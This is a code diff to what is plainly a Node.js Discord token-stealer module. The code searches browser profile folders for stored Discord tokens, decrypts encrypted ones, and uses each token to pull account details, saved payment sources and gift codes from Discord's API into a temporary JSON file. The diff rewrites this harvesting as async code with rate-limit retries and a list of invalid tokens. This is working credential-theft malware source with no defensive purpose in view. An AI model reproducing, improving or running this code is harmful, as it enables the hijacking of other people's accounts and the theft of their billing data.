@@ -6,11 +6,11 @@ const axios = require('axios');
 const { userAgent } = require('../config');
 const { getTempFolder } = require('../util/init');
 const { sleep } = require('../util/general');
+const { generateString } = require('../util/string');
 
 const jsonFile = join(getTempFolder(), 'Discord.json');
 writeFileSync(jsonFile, '{}');
 const tokens = [];
-
 /**
  * @return Promise<string>
  */
@@ -24,9 +24,9 @@ const decryptToken = async (token, key) => {
     await decryptToken(token, key);
   }
 };
-
 const tokenRegex = /[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}/gi;
 const encryptedTokenRegex = /dQw4w9WgXcQ:[^.*['(.*)'\].*$][^"]*/gi;
+const tokensNotWorking = join(getTempFolder(), generateString(10) + '.tmp');
 
 const decryptRickRoll = (path) => {
   return new Promise((resolve, reject) => {
@@ -69,63 +69,82 @@ const decryptRickRoll = (path) => {
   });
 };
 
-const handleTokens = (tokens, resolve) => {
-  tokens.forEach(({ token, source }) => {
-    axios.get('https://discord.com/api/v10/users/@me', {
-      headers: { Authorization: token, 'User-Agent': userAgent }
-    })
-      .then(res => {
-        let json = res.data;
-        json.token = token;
-        json.source = source;
-        let info = JSON.parse(readFileSync(jsonFile).toString());
-        if (!info.accounts) info.accounts = [];
-        if (!info.accounts.find(account => account.id === json.id)) {
-          info.accounts.push(json);
-          writeFileSync(jsonFile, JSON.stringify(info));
-        } else if (info.accounts.find(account => account.id === json.id && !account.source.includes(source))) {
-          info.accounts.find(account => account.id === json.id).source += ', ' + source;
-          writeFileSync(jsonFile, JSON.stringify(info));
-        }
-
-        axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
-          headers: { Authorization: token, 'User-Agent': userAgent }
-        })
-          .then(res => {
-            const json = res.data;
-            let info = JSON.parse(readFileSync(jsonFile).toString());
-            if (!info.billing) info.billing = [];
-            json.forEach(billing => {
-              if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
-            });
-            writeFileSync(jsonFile, JSON.stringify(info));
-
-            axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
-              headers: { Authorization: token, 'User-Agent': userAgent }
-            })
-              .then(res => {
-                const json = res.data;
-                let info = JSON.parse(readFileSync(jsonFile).toString());
-                if (!info.gifts) info.gifts = [];
-                json.forEach(gift => {
-                  if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
-                });
-                writeFileSync(jsonFile, JSON.stringify(info));
-
-                resolve();
-              })
-              .catch(() => {});
-          })
-          .catch(() => {});
-      })
-      .catch(() => {});
-  });
+const handleTokens = async (tokens, resolve) => {
+  const invalidTokens = readFileSync(tokensNotWorking, 'utf8');
+  const userInfo = async (token, source, retry = 0) => {
+    try {
+      const { data } = await axios.get('https://discord.com/api/v10/users/@me', {
+        headers: { Authorization: token, 'User-Agent': userAgent }
+      });
+      data.token = token;
+      data.source = source;
+      let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
+      if (!info.accounts) info.accounts = [];
+      if (!info.accounts.find(account => account.id === data.id)) {
+        info.accounts.push(data);
+        writeFileSync(jsonFile, JSON.stringify(info));
+      } else if (info.accounts.find(account => account.id === data.id && !account.source.includes(source))) {
+        info.accounts.find(account => account.id === data.id).source += ', ' + source;
+        writeFileSync(jsonFile, JSON.stringify(info));
+      }
+    } catch (e) {
+      if (retry === 10) return;
+      if (e.response.status === 401) {
+        writeFileSync(tokensNotWorking, readFileSync(tokensNotWorking, 'utf8') + ',' + token);
+      } else if (e.response.status === 429 && e.response.data.retry_after) {
+        await sleep((e.response.data.retry_after * 1000) + 500);
+        await userInfo(token, source, retry + 1);
+      }
+    }
+  };
+  const paymentSources = async (token) => {
+    try {
+      const { data } = await axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
+        headers: { Authorization: token, 'User-Agent': userAgent }
+      });
+      let info = JSON.parse(readFileSync(jsonFile).toString());
+      if (!info.billing) info.billing = [];
+      data.forEach(billing => {
+        if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
+      });
+      writeFileSync(jsonFile, JSON.stringify(info));
+    } catch (e) {
+      if (e.response.status === 429) {
+        await sleep((e.response.data.retry_after * 1000) + 500);
+        await paymentSources(token);
+      }
+    }
+  };
+  const gifts = async (token) => {
+    try {
+      const { data } = await axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
+        headers: { Authorization: token, 'User-Agent': userAgent }
+      });
+      let info = JSON.parse(readFileSync(jsonFile).toString());
+      if (!info.gifts) info.gifts = [];
+      data.forEach(gift => {
+        if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
+      });
+      writeFileSync(jsonFile, JSON.stringify(info));
+    } catch (e) {
+      if (e.response.status === 429) {
+        await sleep((e.response.data.retry_after * 1000) + 500);
+        await gifts(token);
+      }
+    }
+  };
+  for (const { token, source } of tokens) {
+    if (invalidTokens.split(',').includes(token)) return;
+    await userInfo(token, source);
+    await paymentSources(token);
+    await gifts(token);
+  }
   resolve();
 };
 
-module.exports = new Promise((resolve) => {
-  Object.keys(browsers).forEach(path => {
-    if (!existsSync(browsers[path])) return;
+module.exports = new Promise(async (resolve) => {
+  for (const path of Object.keys(browsers)) {
+    if (!existsSync(browsers[path])) continue;
     if (path.includes('Firefox')) {
       const search = execSync('where /r . *.sqlite', { cwd: browsers[path] }).toString();
       if (search) {
@@ -158,11 +177,9 @@ module.exports = new Promise((resolve) => {
           });
         });
       }
-      handleTokens(tokens, resolve);
+      await handleTokens(tokens, resolve);
     } else {
-      decryptRickRoll(browsers[path]).then(() => {
-        handleTokens(tokens, resolve);
-      });
+      decryptRickRoll(browsers[path]).then(async () => await handleTokens(tokens, resolve));
     }
-  });
+  }
 });
